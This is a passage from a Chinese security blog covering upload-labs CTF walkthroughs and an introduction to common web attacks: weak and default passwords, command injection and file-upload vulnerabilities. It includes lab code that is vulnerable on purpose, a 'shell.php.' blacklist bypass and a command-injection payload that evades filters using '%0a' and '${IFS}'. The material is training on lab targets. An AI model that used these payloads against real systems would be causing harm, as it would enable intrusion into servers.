operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>            $msg <span class="token operator">=</span> <span class="token string">'这个文件不能上传到服务器的临时文件存储目录。'</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>         <span class="token keyword">case</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">:</span>            $msg <span class="token operator">=</span> <span class="token string">'上传失败，上传目录不可写。'</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>         <span class="token keyword">case</span> <span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">:</span>            $msg <span class="token operator">=</span> <span class="token string">'上传失败，无法上传该类型文件。'</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>         <span class="token keyword">case</span> <span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span>            $msg <span class="token operator">=</span> <span class="token string">'上传失败，上传的文件过大。'</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>         <span class="token keyword">case</span> <span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">:</span>            $msg <span class="token operator">=</span> <span class="token string">'上传失败，服务器已经存在相同名称文件。'</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>         <span class="token keyword">case</span> <span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span>            $msg <span class="token operator">=</span> <span class="token string">'文件无法上传，文件不能复制到目标目录。'</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>              <span class="token keyword">default</span><span class="token punctuation">:</span>            $msg <span class="token operator">=</span> <span class="token string">'未知错误！'</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//myupload.php</span><span class="token keyword">class</span> <span class="token class-name">MyUpload</span><span class="token punctuation">{</span><span class="token operator">...</span><span class="token operator">...</span><span class="token operator">...</span><span class="token operator">...</span><span class="token operator">...</span><span class="token operator">...</span>   <span class="token keyword">var</span> $cls_arr_ext_accepted <span class="token operator">=</span> <span class="token function">array</span><span class="token punctuation">(</span>      <span class="token string">".doc"</span><span class="token punctuation">,</span> <span class="token string">".xls"</span><span class="token punctuation">,</span> <span class="token string">".txt"</span><span class="token punctuation">,</span> <span class="token string">".pdf"</span><span class="token punctuation">,</span> <span class="token string">".gif"</span><span class="token punctuation">,</span> <span class="token string">".jpg"</span><span class="token punctuation">,</span> <span class="token string">".zip"</span><span class="token punctuation">,</span> <span class="token string">".rar"</span><span class="token punctuation">,</span> <span class="token string">".7z"</span><span class="token punctuation">,</span><span class="token string">".ppt"</span><span class="token punctuation">,</span>      <span class="token string">".html"</span><span class="token punctuation">,</span> <span class="token string">".xml"</span><span class="token punctuation">,</span> <span class="token string">".tiff"</span><span class="token punctuation">,</span> <span class="token string">".jpeg"</span><span class="token punctuation">,</span> <span class="token string">".png"</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">...</span><span class="token operator">...</span><span class="token operator">...</span><span class="token operator">...</span><span class="token operator">...</span><span class="token operator">...</span>    <span class="token comment" spellcheck="true">/** upload()   **   ** Method to upload the file.   ** This is the only method to call outside the class.   ** @para String name of directory we upload to   ** @returns void  **/</span>  <span class="token keyword">function</span> <span class="token function">upload</span><span class="token punctuation">(</span> $dir <span class="token punctuation">)</span><span class="token punctuation">{</span>    $ret <span class="token operator">=</span> $<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">isUploadedFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> $ret <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token keyword">return</span> $<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">resultUpload</span><span class="token punctuation">(</span> $ret <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    $ret <span class="token operator">=</span> $<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setDir</span><span class="token punctuation">(</span> $dir <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> $ret <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token keyword">return</span> $<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">resultUpload</span><span class="token punctuation">(</span> $ret <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    $ret <span class="token operator">=</span> $<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">checkExtension</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> $ret <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token keyword">return</span> $<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">resultUpload</span><span class="token punctuation">(</span> $ret <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    $ret <span class="token operator">=</span> $<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">checkSize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> $ret <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token keyword">return</span> $<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">resultUpload</span><span class="token punctuation">(</span> $ret <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// if flag to check if the file exists is set to 1</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> $<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span>cls_file_exists <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>      $ret <span class="token operator">=</span> $<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">checkFileExists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span> $ret <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> $<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">resultUpload</span><span class="token punctuation">(</span> $ret <span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// if we are here, we are ready to move the file to destination</span>    $ret <span class="token operator">=</span> $<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">move</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> $ret <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token keyword">return</span> $<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">resultUpload</span><span class="token punctuation">(</span> $ret <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// check if we need to rename the file</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> $<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span>cls_rename_file <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>      $ret <span class="token operator">=</span> $<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">renameFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span> $ret <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> $<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">resultUpload</span><span class="token punctuation">(</span> $ret <span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// if we are here, everything worked as planned :)</span>    <span class="token keyword">return</span> $<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">resultUpload</span><span class="token punctuation">(</span> <span class="token string">"SUCCESS"</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token operator">...</span><span class="token operator">...</span><span class="token operator">...</span><span class="token operator">...</span><span class="token operator">...</span><span class="token operator">...</span> <span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h4 id="解题思路-17"><a href="#解题思路-17" class="headerlink" title="解题思路"></a>解题思路</h4><p>​    未完待续</p><h4 id="解题步骤-17"><a href="#解题步骤-17" class="headerlink" title="解题步骤"></a>解题步骤</h4><p>​    未完待续</p><h3 id="Pass-19-点绕过"><a href="#Pass-19-点绕过" class="headerlink" title="Pass-19 点绕过"></a>Pass-19 点绕过</h3><h4 id="提示与查看源码-18"><a href="#提示与查看源码-18" class="headerlink" title="提示与查看源码"></a>提示与查看源码</h4><blockquote><p>本pass的取文件名通过$_POST来获取。</p></blockquote><pre class=" language-js"><code class="language-js">$is_upload <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>$msg <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span>UPLOAD_PATH<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        $deny_ext <span class="token operator">=</span> <span class="token function">array</span><span class="token punctuation">(</span><span class="token string">"php"</span><span class="token punctuation">,</span><span class="token string">"php5"</span><span class="token punctuation">,</span><span class="token string">"php4"</span><span class="token punctuation">,</span><span class="token string">"php3"</span><span class="token punctuation">,</span><span class="token string">"php2"</span><span class="token punctuation">,</span><span class="token string">"html"</span><span class="token punctuation">,</span><span class="token string">"htm"</span><span class="token punctuation">,</span><span class="token string">"phtml"</span><span class="token punctuation">,</span><span class="token string">"pht"</span><span class="token punctuation">,</span><span class="token string">"jsp"</span><span class="token punctuation">,</span><span class="token string">"jspa"</span><span class="token punctuation">,</span><span class="token string">"jspx"</span><span class="token punctuation">,</span><span class="token string">"jsw"</span><span class="token punctuation">,</span><span class="token string">"jsv"</span><span class="token punctuation">,</span><span class="token string">"jspf"</span><span class="token punctuation">,</span><span class="token string">"jtml"</span><span class="token punctuation">,</span><span class="token string">"asp"</span><span class="token punctuation">,</span><span class="token string">"aspx"</span><span class="token punctuation">,</span><span class="token string">"asa"</span><span class="token punctuation">,</span><span class="token string">"asax"</span><span class="token punctuation">,</span><span class="token string">"ascx"</span><span class="token punctuation">,</span><span class="token string">"ashx"</span><span class="token punctuation">,</span><span class="token string">"asmx"</span><span class="token punctuation">,</span><span class="token string">"cer"</span><span class="token punctuation">,</span><span class="token string">"swf"</span><span class="token punctuation">,</span><span class="token string">"htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        $file_name <span class="token operator">=</span> $_POST<span class="token punctuation">[</span><span class="token string">'save_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        $file_ext <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span>$file_name<span class="token punctuation">,</span>PATHINFO_EXTENSION<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span>$file_ext<span class="token punctuation">,</span>$deny_ext<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            $temp_file <span class="token operator">=</span> $_FILES<span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            $img_path <span class="token operator">=</span> UPLOAD_PATH <span class="token punctuation">.</span> <span class="token string">'/'</span> <span class="token punctuation">.</span>$file_name<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span>$temp_file<span class="token punctuation">,</span> $img_path<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                 $is_upload <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                $msg <span class="token operator">=</span> <span class="token string">'上传出错！'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            $msg <span class="token operator">=</span> <span class="token string">'禁止保存为该类型文件！'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        $msg <span class="token operator">=</span> UPLOAD_PATH <span class="token punctuation">.</span> <span class="token string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h4 id="解题思路-18"><a href="#解题思路-18" class="headerlink" title="解题思路"></a>解题思路</h4><ul><li>黑名单策略，文件名用户可控，文件命名<code>shell.php.</code>绕过</li></ul><h4 id="解题步骤-18"><a href="#解题步骤-18" class="headerlink" title="解题步骤"></a>解题步骤</h4><p><img src="http://106.52.86.96/202009060800/image-20200907015629109.png" alt=""></p><ul><li>访问<a href="http://192.168.2.104/upload/shell.php成功" target="_blank" rel="noopener">http://192.168.2.104/upload/shell.php成功</a>~</li></ul><h3 id="Pass-20-审计代码"><a href="#Pass-20-审计代码" class="headerlink" title="Pass-20 审计代码"></a>Pass-20 审计代码</h3><h4 id="提示与查看源码-19"><a href="#提示与查看源码-19" class="headerlink" title="提示与查看源码"></a>提示与查看源码</h4><blockquote><p>Pass-20来源于CTF，请审计代码！</p></blockquote><pre class=" language-js"><code class="language-js">$is_upload <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>$msg <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span>$_FILES<span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//检查MIME</span>    $allow_type <span class="token operator">=</span> <span class="token function">array</span><span class="token punctuation">(</span><span class="token string">'image/jpeg'</span><span class="token punctuation">,</span><span class="token string">'image/png'</span><span class="token punctuation">,</span><span class="token string">'image/gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span>$_FILES<span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>$allow_type<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        $msg <span class="token operator">=</span> <span class="token string">"禁止上传该类型文件!"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//检查文件名</span>        $file <span class="token operator">=</span> <span class="token function">empty</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'save_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> $_FILES<span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> $_POST<span class="token punctuation">[</span><span class="token string">'save_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_array</span><span class="token punctuation">(</span>$file<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            $file <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token function">strtolower</span><span class="token punctuation">(</span>$file<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        $ext <span class="token operator">=</span> <span class="token function">end</span><span class="token punctuation">(</span>$file<span class="token punctuation">)</span><span class="token punctuation">;</span>        $allow_suffix <span class="token operator">=</span> <span class="token function">array</span><span class="token punctuation">(</span><span class="token string">'jpg'</span><span class="token punctuation">,</span><span class="token string">'png'</span><span class="token punctuation">,</span><span class="token string">'gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span>$ext<span class="token punctuation">,</span> $allow_suffix<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            $msg <span class="token operator">=</span> <span class="token string">"禁止上传该后缀文件!"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            $file_name <span class="token operator">=</span> <span class="token function">reset</span><span class="token punctuation">(</span>$file<span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'.'</span> <span class="token punctuation">.</span> $file<span class="token punctuation">[</span><span class="token function">count</span><span class="token punctuation">(</span>$file<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            $temp_file <span class="token operator">=</span> $_FILES<span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            $img_path <span class="token operator">=</span> UPLOAD_PATH <span class="token punctuation">.</span> <span class="token string">'/'</span> <span class="token punctuation">.</span>$file_name<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span>$temp_file<span class="token punctuation">,</span> $img_path<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                $msg <span class="token operator">=</span> <span class="token string">"文件上传成功！"</span><span class="token punctuation">;</span>                $is_upload <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                $msg <span class="token operator">=</span> <span class="token string">"文件上传失败！"</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    $msg <span class="token operator">=</span> <span class="token string">"请选择要上传的文件！"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h4 id="解题思路-19"><a href="#解题思路-19" class="headerlink" title="解题思路"></a>解题思路</h4><p>​    未完待续</p><h4 id="解题步骤-19"><a href="#解题步骤-19" class="headerlink" title="解题步骤"></a>解题步骤</h4><p>​    未完待续</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见WEB攻击基础解读</title>
      <link href="/2020/08/23/web-lou-dong-gong-ji/"/>
      <url>/2020/08/23/web-lou-dong-gong-ji/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Web 安全的对于 Web 从业人员来说是一个非常重要的课题 , 在这里也把自己培训学习内容进一步进行总结 Web 相关的安全攻防知识。</p><h2 id="密码口令"><a href="#密码口令" class="headerlink" title="密码口令"></a>密码口令</h2><blockquote><p>常见的弱口令问题且Web应用未做校验失败锁定方式，轻易使用密码爆破尝试。</p></blockquote><p>这里我通过在CTFHUP平台 (<a href="https://www.ctfhub.com/#/skilltree" target="_blank" rel="noopener">https://www.ctfhub.com/#/skilltree</a>)  中弱口令题目结合 Burp Suite模拟弱口令爆破。</p><h3 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h3><figure class="half"> <img src="http://106.52.86.96/202008230000/image-20200804113314639.png" style="zoom: 50%;" />   <img src="http://106.52.86.96/202008230000/image-20200804113353200.png"  style="zoom:70%;" /></figure><p>尝试猜测使用admin用户进行弱口令验证，使用简单弱口令集来进行爆破</p><img src="http://106.52.86.96/202008230000/image-20200823120358320.png" alt="image-20200823120358320" style="zoom: 70%;" /><img src="http://106.52.86.96/202008230000/image-20200823121304362.png" style="zoom:70%;" /><p>通过密码爆破成功~</p><figure class="half"><img src="http://106.52.86.96/202008230000/image-20200823121334961.png" style="zoom:40%;" /> <img src="http://106.52.86.96/202008230000/image-20200823122009252.png" style="zoom:40%;" /></figure><h3 id="默认口令"><a href="#默认口令" class="headerlink" title="默认口令"></a>默认口令</h3><blockquote><p>默认口令也是经常被大家忽略的一点，往往中、大型企业出厂默认初始化的密码，在网络上均能搜索的到，尝试使用默认口令密码就直接获得了管理员权限。</p></blockquote><p>题目中涉及 北京亿中邮信息技术有限公司的eyou邮件网关管理平台，通过网络查询相关平台文档获得默认口令，成功获得flag</p><p><img src="http://106.52.86.96/202008230000/image-20200823123900760.png" alt=""></p><img src="http://106.52.86.96/202008230000/image-20200823124401201.png" style="zoom: 70%;" /><h2 id="RCE攻击"><a href="#RCE攻击" class="headerlink" title="RCE攻击"></a>RCE攻击</h2><p>RCE (remote code execution) 远程代码执行，简称RCE漏洞，是指用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令，可能会允许攻击者通过改变 $PATH 或程序执行环境的其他方面来执行一个恶意构造的代码</p><h3 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3><blockquote><p>命令注入攻击最初被关注到是Shell命令注入攻击，由挪威一名程序员在1997年意外发现的，第一个命令注入攻击程序能随意地从一个网站删除网页，就像从本地磁盘删除文件一样简单；</p></blockquote><p>在黑客的世界，针对不同的软件系统，有各自特有的命令注入方式。命令注入攻击的常见场景为：仅仅需要输入数据的场合，攻击者构造数据同时输入了恶意命令代码，而系统对此并未过滤，恶意命令代码一并执行，最终导致信息泄露或者正常数据的破坏</p><pre class=" language-bash"><code class="language-bash">常见命令执行连接符A<span class="token punctuation">;</span>B      <span class="token comment" spellcheck="true">#简单拼接，AB之间无制约条件</span>A<span class="token operator">&amp;</span>B      <span class="token comment" spellcheck="true">#简单拼接，AB之间无制约条件</span>A<span class="token operator">&amp;&amp;</span>B     <span class="token comment" spellcheck="true">#A执行成功，然后执行B</span>A<span class="token operator">|</span>B      <span class="token comment" spellcheck="true">#A的输出，作为B的输入</span>A<span class="token operator">||</span>B     <span class="token comment" spellcheck="true">#A的执行失败，然后再执行B</span>%0a      <span class="token comment" spellcheck="true">#换行符</span></code></pre><img src="http://106.52.86.96/202008230000/image-20200823131601360.png" style="zoom: 67%;" /><p>接下来我们继续在靶场 <strong><code>ctfhub</code></strong> 中进行模拟尝试简单的的命令注入题</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token constant">FALSE</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string">"ping -c 4 {$_GET['ip']}"</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//通过GET请求获取IP执行ping命令，未进行任何的过滤校验</span>  <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">,</span> <span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token comment" spellcheck="true">//执行命令回显结果</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><figure class="half"><img src="http://106.52.86.96/202008230000/image-20200823130245562.png" style="zoom:40%;" /><img src="http://106.52.86.96/202008230000/image-20200823130406094.png" style="zoom:40%;" /></figure><p>接下来我们继续在靶场 <strong><code>ctfhub</code></strong> 中进行其他一道命令注入题，这道题已经涉及了各种过滤方式。</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token constant">FALSE</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$m</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string">"/(\||&amp;|;| |\/|cat|flag|ctfhub)/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$m</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//过滤cat、flag、；、||空格 等等</span>        <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string">"ping -c 4 {$ip}"</span><span class="token punctuation">;</span>        <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">,</span> <span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$m</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><img src="http://106.52.86.96/202008230000/image-20200823142258906.png"  style="zoom:67%;" /><p>常见命令拼接均已被限制过滤，现在可以考虑使用URL编码绕过方式，使用<strong><code>%0a</code></strong>换行符来来替||拼接，在bash中IFS是内部的域分隔符，使用<strong><code>${IFS}</code></strong>来代替空格，由于flag关键字也被过滤，可以使用<strong><code>*</code></strong>来匹配文件，方式多种多样都可以尝试。cat可以使用ca\t或者ca’’t等多种方式。  URL编码 参考 <a href="https://www.w3school.com.cn/tags/html_ref_urlencode.html" target="_blank" rel="noopener">https://www.w3school.com.cn/tags/html_ref_urlencode.html</a></p><img src="http://106.52.86.96/202008230000/image-20200823141858774.png"  style="zoom:67%;" /><pre class=" language-html"><code class="language-html">?ip=127.0.0.1%0als%0acd${IFS}*_is_here%0als%0aca\t${IFS}\*_285661578716699.php#内容解读#127.0.0.1%0a #ls%0a #cd${IFS}*_is_here%0a #ca\t${IFS}\*_285661578716699.php#执行最终得到flag</code></pre><img src="http://106.52.86.96/202008230000/image-20200823143206336.png"  style="zoom:67%;" /><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h4 id="文件上传漏洞简介"><a href="#文件上传漏洞简介" class="headerlink" title="文件上传漏洞简介"></a>文件上传漏洞简介</h4><p>现代互联网的Web应用程序中，上传文件是⼀种常见的功能，因为它有助于提高业务效率，比如企业的 OA 系统，允许用户上传图片、视频、头像和许多其他类的文件。然而向用户提供的功能越多，Web应用受到攻击的风险就越大，如果Web应用存在文件上传漏洞，那么恶意用户就可以利用文件上传漏洞将可执行脚本程序（WebShell）上传到服务器中，获得网站的权限，然后可以进⼀步对服务器进行入侵，扩大控制权限。</p><h3 id="漏洞产生原因"><a href="#漏洞产生原因" class="headerlink" title="漏洞产生原因"></a>漏洞产生原因</h3><p>上传文件时，如果服务端代码没有对客户端上传的⽂件进行严格的验证和过滤， 就容易造成可以上传任意文件的情况，包括上传脚本文件(asp、aspx、php、jsp等格式的文件)。</p><h3 id="漏洞的危害"><a href="#漏洞的危害" class="headerlink" title="漏洞的危害"></a>漏洞的危害</h3><p>非法用户可以利用上传的恶意脚本文件控制整个网站，甚至控制服务器。这个恶意的脚本⽂件，又被称为WebShell脚本，具有非常强大的功能，比如查看服务器目录、服务器中的文件，执行系统命令等。</p><p>WebShell 就是以 